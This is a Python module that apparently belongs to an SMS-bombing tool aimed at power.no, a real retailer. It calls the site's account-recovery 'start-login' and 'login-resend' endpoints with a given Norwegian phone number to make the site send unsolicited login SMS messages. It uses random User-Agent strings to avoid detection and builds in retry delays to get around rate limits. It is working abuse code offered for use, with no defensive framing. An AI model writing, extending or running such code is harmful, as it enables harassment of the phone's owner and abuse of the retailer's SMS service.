import os
import inspect
from fake_useragent import UserAgent

class Request:
    def __init__(self, phone_number, session):
        self.url = "https://www.power.no"
        self.phone_number = phone_number
        self.session = session
        self.headers = {"User-Agent": UserAgent().random}
        self.file_name = os.path.basename(__file__)

    async def fetch_id(self):
        data = {"username": f"+47{self.phone_number}"}
        try:
            async with self.session.post(f"{self.url}/api/v2/mypower/recovery/start-login", json=data, headers=self.headers) as http_response:
                if http_response.status != 200:
                    return False, f"Error in {self.file_name} at line {inspect.currentframe().f_lineno}: Status {http_response.status}", 60
                json_response = await http_response.json()
                user_id = json_response.get('value', {}).get('id')
                if user_id:
                    return True, user_id, None
                else:
                    return False, f"Error in {self.file_name} at line {inspect.currentframe().f_lineno}: No ID found in response", 60
        except Exception as e:
            return False, f"Error in {self.file_name} at line {inspect.currentframe().f_lineno}: Failed sending request: {e}", 60

    async def send_sms(self):
        sent, result, retry = await self.fetch_id()
        if not sent:
            return False, result, retry
        data = {
            "id": result,
            "username": f"+47{self.phone_number}"
        }
        try:
            async with self.session.post(f"{self.url}/api/v2/mypower/recovery/login-resend", json=data, headers=self.headers) as http_response:
                if http_response.status != 200:
                    return False, f"Error in {self.file_name} at line {inspect.currentframe().f_lineno}: probably due to rate limiting", 60
                json_response = await http_response.json()
                success = json_response.get('value', {}).get('success')
                if success:
                    return True, f"SMS sent successfully to +47{self.phone_number} from power.no", None
                else:
                    return False, f"Error in {self.file_name} at line {inspect.currentframe().f_lineno}: SMS not sent", 60
        except Exception as e:
            return False, f"Error in {self.file_name} at line {inspect.currentframe().f_lineno}: Failed sending request: {e}", 60